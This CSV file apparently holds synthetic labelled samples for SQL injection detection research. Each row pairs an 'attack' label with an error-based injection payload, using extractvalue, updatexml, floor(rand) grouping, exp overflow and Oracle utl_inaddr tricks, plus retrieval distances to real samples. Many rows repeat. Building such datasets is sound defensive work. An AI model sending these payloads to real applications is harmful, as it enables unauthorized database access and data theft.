id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_001053,attack,error,"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000019,5.994819007481786
CTGAN_001054,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000024,7.120354052918793
CTGAN_001055,attack,error,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000046,5.999615590960677
CTGAN_001056,attack,error,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""nwzu"" like ""nwzu",nearest_attack_euclidean,R000012,10.30062542595761
CTGAN_001057,attack,error,"1'||  (  select 'xuou' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R000033,7.502649242795576
CTGAN_001058,attack,error,"1  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  3326  =  3326",nearest_attack_euclidean,R000072,6.097700116081287
CTGAN_001059,attack,error,"-6236'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000077,5.7017148626670515
CTGAN_001060,attack,error,"-9176'   )    )    as eunw where 5978  =  5978 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000065,8.220395668132026
CTGAN_001061,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'swua' like 'swua",nearest_attack_euclidean,R000070,7.520173639039606
CTGAN_001062,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'ywxe' like 'ywxe",nearest_attack_euclidean,R000032,8.64811899581391
CTGAN_001063,attack,error,"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000055,8.797180279253116
CTGAN_001064,attack,error,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""jzbb""  =  ""jzbb",nearest_attack_euclidean,R000050,6.337619686836956
CTGAN_001065,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000024,8.651676500324092
CTGAN_001066,attack,error,-7319 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000008,7.992232508164483
CTGAN_001067,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,6.354774120312752
CTGAN_001068,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000074,8.59435295277518
CTGAN_001069,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'ywxe' like 'ywxe",nearest_attack_euclidean,R000032,10.813662626837758
CTGAN_001070,attack,error,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""jzbb""  =  ""jzbb",nearest_attack_euclidean,R000050,5.940420241540034
CTGAN_001071,attack,error,"1  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  3326  =  3326",nearest_attack_euclidean,R000072,8.50649947311185
CTGAN_001072,attack,error,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""jzbb""  =  ""jzbb",nearest_attack_euclidean,R000050,8.53593793588523
CTGAN_001073,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,7.2356066202219465
CTGAN_001074,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,7.690717076796229
CTGAN_001075,attack,error,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000044,7.856380082122822
CTGAN_001076,attack,error,"-9176'   )    )    as eunw where 5978  =  5978 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000065,6.908421953244454
CTGAN_001077,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000039,7.441807811103437
CTGAN_001078,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'eiau'  =  'eiau",nearest_attack_euclidean,R000047,7.515998926219856
CTGAN_001079,attack,error,"1  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  3326  =  3326",nearest_attack_euclidean,R000072,7.188175830252601
CTGAN_001080,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,6.122724763398732
CTGAN_001081,attack,error,"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000064,7.464478223450461
CTGAN_001082,attack,error,1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000069,7.9027326615223155
CTGAN_001083,attack,error,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""jzbb""  =  ""jzbb",nearest_attack_euclidean,R000050,5.5387715440060035
CTGAN_001084,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000074,8.874484753158102
CTGAN_001085,attack,error,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000044,6.934373124152294
CTGAN_001086,attack,error,"1  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  3326  =  3326",nearest_attack_euclidean,R000072,6.384111358907195
CTGAN_001087,attack,error,1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'fdbm' like 'fdbm,nearest_attack_euclidean,R000060,7.93241672752977
CTGAN_001088,attack,error,"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000031,6.735640061904829
CTGAN_001089,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,7.189667145426184
CTGAN_001090,attack,error,"-9176'   )    )    as eunw where 5978  =  5978 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000065,6.48359073011329
CTGAN_001091,attack,error,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""jzbb""  =  ""jzbb",nearest_attack_euclidean,R000050,6.930481479247799
CTGAN_001092,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'eiau'  =  'eiau",nearest_attack_euclidean,R000047,6.692710820547782
CTGAN_001093,attack,error,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""jzbb""  =  ""jzbb",nearest_attack_euclidean,R000050,6.490458678416307
CTGAN_001094,attack,error,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""jzbb""  =  ""jzbb",nearest_attack_euclidean,R000050,7.510890957641965
CTGAN_001095,attack,error,"1  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  3326  =  3326",nearest_attack_euclidean,R000072,6.7751831757993015
CTGAN_001096,attack,error,"1'||  (  select 'xuou' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R000033,5.4600552165181915
CTGAN_001097,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000039,9.585181042350262
CTGAN_001098,attack,error,"1'||  (  select 'vsfg' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",nearest_attack_euclidean,R000023,6.841078303714336
CTGAN_001099,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,5.911911073826893
CTGAN_001100,attack,error,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'jwbt'  =  'jwbt",nearest_attack_euclidean,R000063,5.754626962512767
CTGAN_001101,attack,error,"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000061,7.434401008701716
CTGAN_001102,attack,error,"1  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  3326  =  3326",nearest_attack_euclidean,R000072,6.792763191603491
CTGAN_001103,attack,error,1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'fdbm' like 'fdbm,nearest_attack_euclidean,R000060,6.432710678570657
CTGAN_001104,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,6.086852856122482
CTGAN_001105,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,7.32616163883984
CTGAN_001106,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000074,7.566505466066767
CTGAN_001107,attack,error,"1   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   9325  =  9325",nearest_attack_euclidean,R000051,8.066596067526605
CTGAN_001108,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,5.674855423733962
CTGAN_001109,attack,error,"1  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  3326  =  3326",nearest_attack_euclidean,R000072,6.316705125718306
CTGAN_001110,attack,error,"-9176'   )    )    as eunw where 5978  =  5978 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000065,7.333588078962886
CTGAN_001111,attack,error,"-9176'   )    )    as eunw where 5978  =  5978 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000065,9.356020341416485
CTGAN_001112,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,6.526700166383703
CTGAN_001113,attack,error,"1   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  4510  =  4510",nearest_attack_euclidean,R000015,6.908672671275618
CTGAN_001114,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,7.67834598558541
CTGAN_001115,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'eiau'  =  'eiau",nearest_attack_euclidean,R000047,6.133713528563519
CTGAN_001116,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,7.980016962965594
CTGAN_001117,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000074,6.576803484845218
CTGAN_001118,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,5.865962167561491
CTGAN_001119,attack,error,"-9176'   )    )    as eunw where 5978  =  5978 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000065,5.834208416434603
CTGAN_001120,attack,error,"1'||  (  select 'xuou' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R000033,5.517952810036815
CTGAN_001121,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,9.355063374806829
CTGAN_001122,attack,error,"1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000014,7.043253423780214
CTGAN_001123,attack,error,"1  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  3326  =  3326",nearest_attack_euclidean,R000072,6.1549391668114355
CTGAN_001124,attack,error,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""sdvu"" like ""sdvu",nearest_attack_euclidean,R000056,8.843354091937151
CTGAN_001125,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,6.454383666447216
CTGAN_001126,attack,error,"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000061,7.712717440080307
CTGAN_001127,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000074,6.683852466204026
CTGAN_001128,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,5.853396818223962
CTGAN_001129,attack,error,"1  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  3326  =  3326",nearest_attack_euclidean,R000072,8.256536623835068
CTGAN_001130,attack,error,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000044,6.128164936389082
CTGAN_001131,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,5.759602004497676
CTGAN_001132,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,6.695957896125332
CTGAN_001133,attack,error,"1   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   9325  =  9325",nearest_attack_euclidean,R000051,8.01728114777997
CTGAN_001134,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,8.012661144204985
CTGAN_001135,attack,error,"-5032' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000018,7.380705425867411
CTGAN_001136,attack,error,"1'||  (  select 'oyyu' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",nearest_attack_euclidean,R000013,5.096407688749092
CTGAN_001137,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000039,9.831397323931892
CTGAN_001138,attack,error,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""jzbb""  =  ""jzbb",nearest_attack_euclidean,R000050,8.017121838748283
